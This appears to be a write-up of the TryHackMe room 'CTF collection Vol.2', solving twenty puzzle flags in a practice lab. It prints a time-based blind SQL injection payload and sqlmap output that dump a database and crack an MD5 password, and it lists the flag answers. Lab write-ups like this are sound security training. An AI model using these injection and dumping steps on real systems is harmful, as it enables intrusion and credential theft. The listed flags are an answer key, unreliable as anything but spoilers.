## CTF collection Vol.2
https://tryhackme.com/room/ctfcollectionvol2

## Flag
### Easter 1
Hint:Check the robots
```
curl ip.thm/robots.txt
User-agent: * (I don't think this is entirely true, DesKel just wanna to play himself)
Disallow: /VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=


45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d
```

```
echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
Easter 1: THM{4u70b07_r0ll_0u7}
```

### Easter 2
Hint:Decode the base64 multiple times. Don't forget there are something being encoded.

![image](https://user-images.githubusercontent.com/6504854/188316104-7e030c0f-bbe3-4f5b-b4f8-035b7784b536.png)

From Base64 -> Remove Whitespace -> From Base64 -> Remove Whitespace -> From Base64
😫😫😫

```
curl ip.thm/DesKel_secret_base/
<html>
    <head>
        <title> A slow clap for you</title>
        <h1 style="text-align:center;">A slow clap for you</h1>
    </head>
    
    <body>
    <p style="text-align:center;"><img src="kim.png"/></p>
    <p style="text-align:center;">Not bad, not bad.... papa give you a clap</p>
    <p style="text-align:center;color:white;">Easter 2: THM{f4ll3n_b453}</p>
    </body>

</html>
```
### Easter 3,4
![image](https://user-images.githubusercontent.com/6504854/188316522-762b50d9-f6a4-493d-a181-525e75773a16.png)
save item as 1.txt

```
sqlmap -r 1.txt --batch --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:36:13 /2022-09-04/

[20:36:13] [INFO] parsing HTTP request from '1.txt'
[20:36:14] [INFO] resuming back-end DBMS 'mysql'
[20:36:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 1720 FROM (SELECT(SLEEP(5)))imDO) AND 'CRGb'='CRGb&password=test&submit=submit
---
[20:36:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 12.10 or 12.04 or 13.04 (Precise Pangolin or Quantal Quetzal or Raring Ringtail)
web application technology: PHP 5.3.10, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[20:36:14] [INFO] fetching database names
[20:36:14] [INFO] fetching number of databases
[20:36:14] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[20:36:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
4
[20:36:39] [INFO] retrieved:
[20:36:50] [INFO] adjusting time delay to 3 seconds due to good response times
information_schema
[20:40:40] [INFO] retrieved: THM_f0und_m3
[20:44:14] [INFO] retrieved: mysql
[20:45:21] [INFO] retrieved: performan^C


[*] ending @ 20:47:24 /2022-09-04/

```
```
sqlmap -r 1.txt --batch --tables -D THM_f0und_m3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:48:34 /2022-09-04/

[20:48:34] [INFO] parsing HTTP request from '1.txt'
[20:48:34] [INFO] resuming back-end DBMS 'mysql'
[20:48:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 1720 FROM (SELECT(SLEEP(5)))imDO) AND 'CRGb'='CRGb&password=test&submit=submit
---
[20:48:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Quantal Quetzal or Raring Ringtail or Precise Pangolin)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[20:48:35] [INFO] fetching tables for database: 'THM_f0und_m3'
[20:48:35] [INFO] fetching number of tables for database 'THM_f0und_m3'
[20:48:35] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[20:48:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[20:49:03] [INFO] retrieved:
[20:49:09] [INFO] adjusting time delay to 2 seconds due to good response times
nothing_inside
[20:51:36] [INFO] retrieved: user
Database: THM_f0und_m3
[2 tables]
+----------------+
| user           |
| nothing_inside |
+----------------+

[20:52:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/ip.thm'
```

```
sqlmap -r 1.txt --batch --dump -D THM_f0und_m3 -T user
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:55:34 /2022-09-04/

[20:55:34] [INFO] parsing HTTP request from '1.txt'
[20:55:34] [INFO] resuming back-end DBMS 'mysql'
[20:55:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 1720 FROM (SELECT(SLEEP(5)))imDO) AND 'CRGb'='CRGb&password=test&submit=submit
---
[20:55:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 12.10 or 13.04 or 12.04 (Raring Ringtail or Quantal Quetzal or Precise Pangolin)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL >= 5.0.12
[20:55:35] [INFO] fetching columns for table 'user' in database 'THM_f0und_m3'
[20:55:35] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[20:55:51] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
2
[20:56:05] [INFO] retrieved:
[20:56:11] [INFO] adjusting time delay to 3 seconds due to good response times
username
[20:57:45] [INFO] retrieved: password
[20:59:39] [INFO] fetching entries for table 'user' in database 'THM_f0und_m3'
[20:59:39] [INFO] fetching number of entries for table 'user' in database 'THM_f0und_m3'
[20:59:39] [INFO] retrieved: 2
[20:59:50] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[21:00:16] [INFO] adjusting time delay to 2 seconds due to good response times
05f3672ba34409136aa71b8d00070d1b
[21:05:25] [INFO] retrieved: DesKel
[21:06:29] [INFO] retrieved: He is a nice guy, say hello for me
[21:12:38] [INFO] retrieved: Skidy
[21:13:29] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:13:29] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:13:29] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:13:29] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[21:13:29] [INFO] starting 8 processes
[21:13:33] [INFO] cracked password 'cutie' for user 'DesKel'
Database: THM_f0und_m3
Table: user
[2 entries]
+------------------------------------------+----------+
| password                                 | username |
+------------------------------------------+----------+
| 05f3672ba34409136aa71b8d00070d1b (cutie) | DesKel   |
| He is a nice guy, say hello for me       | Skidy    |
+------------------------------------------+----------+

[21:13:41] [INFO] table 'THM_f0und_m3.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/ip.thm/dump/THM_f0und_m3/user.csv'
[21:13:41] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/ip.thm'

[*] ending @ 21:13:41 /2022-09-04/
```
![image](https://user-images.githubusercontent.com/6504854/188316742-64a7a9c5-01ac-4018-aa38-c885ea38277d.png)

```
sqlmap -r 1.txt --batch --dump -D THM_f0und_m3 -T nothing_inside
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:25:48 /2022-09-04/

[21:25:48] [INFO] parsing HTTP request from '1.txt'
[21:25:48] [INFO] resuming back-end DBMS 'mysql'
[21:25:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 1720 FROM (SELECT(SLEEP(5)))imDO) AND 'CRGb'='CRGb&password=test&submit=submit
---
[21:25:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.10 or 12.04 (Quantal Quetzal or Raring Ringtail or Precise Pangolin)
web application technology: PHP 5.3.10, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[21:25:49] [INFO] fetching columns for table 'nothing_inside' in database 'THM_f0und_m3'
[21:25:49] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[21:26:05] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[21:26:13] [INFO] retrieved:
[21:26:27] [INFO] adjusting time delay to 3 seconds due to good response times
Easter_4
[21:28:07] [INFO] fetching entries for table 'nothing_inside' in database 'THM_f0und_m3'
[21:28:07] [INFO] fetching number of entries for table 'nothing_inside' in database 'THM_f0und_m3'
[21:28:07] [INFO] retrieved: 1
[21:28:14] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
THM{1nj3c7_l1k3_4_b055}
Database: THM_f0und_m3
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{1nj3c7_l1k3_4_b055} |
+-------------------------+

[21:34:22] [INFO] table 'THM_f0und_m3.nothing_inside' dumped to CSV file '/root/.local/share/sqlmap/output/ip.thm/dump/THM_f0und_m3/nothing_inside.csv'
[21:34:22] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/ip.thm'

[*] ending @ 21:34:22 /2022-09-04/
```
![image](https://user-images.githubusercontent.com/6504854/188316973-dfdcb912-56c1-44d7-bd7c-73dd74d72120.png)

### Easter 5
![image](https://user-images.githubusercontent.com/6504854/188317196-4745b737-688e-4df5-9dfe-2b7c4ad2568f.png)

### Easter 6
![image](https://user-images.githubusercontent.com/6504854/188317341-046dea18-794b-43b8-93b8-dbdbd091ce14.png)

### Easter 7
Hint:Cookie is delicious
![image](https://user-images.githubusercontent.com/6504854/188317544-56e717b0-4ae0-4aa4-a903-6fc4647a4106.png)

### Easter 8
Hint:Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
![image](https://user-images.githubusercontent.com/6504854/188317723-b89018dc-f433-4a8a-b50e-61abb4575ff4.png)

### Easter 9
![image](https://user-images.githubusercontent.com/6504854/188317813-7e29e854-c037-498e-a6b9-e6bf206ed964.png)
![image](https://user-images.githubusercontent.com/6504854/188317830-fd3ac470-2d34-411e-9688-a6929a1274b1.png)

### Easter 10
Hint:Look at THM URL without https:// and use it as a referrer.
![image](https://user-images.githubusercontent.com/6504854/188317955-ee5a4c0c-6c3e-4849-a56a-0620583945be.png)

### Easter 11
![image](https://user-images.githubusercontent.com/6504854/188318053-c5b22a6f-9d81-41fc-a94a-1463767168ed.png)

### Easter 12
![image](https://user-images.githubusercontent.com/6504854/188318104-3b53f3e1-cf6e-4d97-ba8a-dff387f1967b.png)
![image](https://user-images.githubusercontent.com/6504854/188318188-f21ca6fa-3c14-474a-87d3-fe0c77924b5d.png)

### Easter 13
![image](https://user-images.githubusercontent.com/6504854/188318245-3022594d-b8df-4bc6-b2ff-36cd2002ace9.png)

### Easter 14
![image](https://user-images.githubusercontent.com/6504854/188318467-5013eb5a-d6d4-4f7d-867d-07f8235e6fad.png)
![image](https://user-images.githubusercontent.com/6504854/188318872-de6ca74b-633b-4c2f-a564-21cb2d971699.png)

### Easter 15
```
curl ip.thm/game1/
<html>
    <head>
        <title>Game 1</title>
        <h1>Guess the combination</h1>
    </head>
    
    <body>
    <form method="POST">
        Your answer:<br>
        <input type="text" name="answer" required>
    </form>
        <p>Your hash: </p>
    <p>hints: 51 89 77 93 126 14 93 10 </p>
    </body>

</html>
```
```
curl -d "answer=ABCDEFGHIJKLMNOPQRSTUVWXYZ" -X POST ip.thm/game1/
<html>
    <head>
        <title>Game 1</title>
        <h1>Guess the combination</h1>
    </head>
    
    <body>
    <form method="POST">
        Your answer:<br>
        <input type="text" name="answer" required>
    </form>
        <p>Your hash:  99 100 101 102 103 104 51 52 53 54 55 56 57 58 126 127 128 129 130 131 136 137 138 139 140 141</p>
    <p>hints: 51 89 77 93 126 14 93 10 </p>
    </body>

</html>

curl -d "answer=abcdefghijklmnopqrstuvwxyz" -X POST ip.thm/game1/
<html>
    <head>
        <title>Game 1</title>
        <h1>Guess the combination</h1>
    </head>
    
    <body>
    <form method="POST">
        Your answer:<br>
        <input type="text" name="answer" required>
    </form>
        <p>Your hash:  89 90 91 92 93 94 95 41 42 43 75 76 77 78 79 80 81 10 11 12 13 14 15 16 17 18</p>
    <p>hints: 51 89 77 93 126 14 93 10 </p>
    </body>

</html>
```

51 89 77 93 126 14 93 10
G  a  m  e  O   v  e  r

```
curl -d "answer=GameOver" -X POST ip.thm/game1/
<html>
    <head>
        <title>Game 1</title>
        <h1>Guess the combination</h1>
    </head>
    
    <body>
    <form method="POST">
        Your answer:<br>
        <input type="text" name="answer" required>
    </form>
    Good job on completing the puzzle, Easter 15: THM{ju57_4_64m3}  <p>Your hash:  51 89 77 93 126 14 93 10</p>
    <p>hints: 51 89 77 93 126 14 93 10 </p>
    </body>

</html>
```

### Easter 16

```
curl -d "button1=button1&button2=button2&button3=button3" -X POST ip.thm/game2/
<html>
        <head>
                <title>Game 2</title>
                <h1>Press the button simultaneously</h1>
        </head>
    <body>
    
    <form method="POST">
        <input type="hidden" name="button1" value="button1">
        <button name="submit" value="submit">Button 1</button>
    </form>

    <form method="POST">
                <input type="hidden" name="button2" value="button2">
                <button name="submit" value="submit">Button 2</button>
        </form>

    <form method="POST">
                <input type="hidden" name="button3" value="button3">
                <button name="submit" value="submit">Button 3</button>
        </form>
    Just temper the code and you are good to go. Easter 16: THM{73mp3r_7h3_h7ml}    </body>
</html>
```
### Easter 17

### Easter 18
Hint: Request header. Format is egg:Yes
```
curl -s  -H "egg: Yes" http://ip.thm/ | grep Easter
That's it, you just need to say YESSSSSSSSSS. Easter 18: THM{70ny_r0ll_7h3_366} <img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/><img src="egg.gif"/>
```
### Easter 19
```
wget ip.thm/small
```
### Easter 20
Hint: You need to POST the data instead of GET. Burp suite or curl might help.

![image](https://user-images.githubusercontent.com/6504854/188320275-b3d86d24-6768-4f2b-baa4-65be55a8d34c.png)

Thank you for your time. Happy Hacking 😄

なんか長いだけだった。なにこれ。

そろそろWindowsなんとかせねば、うーん。
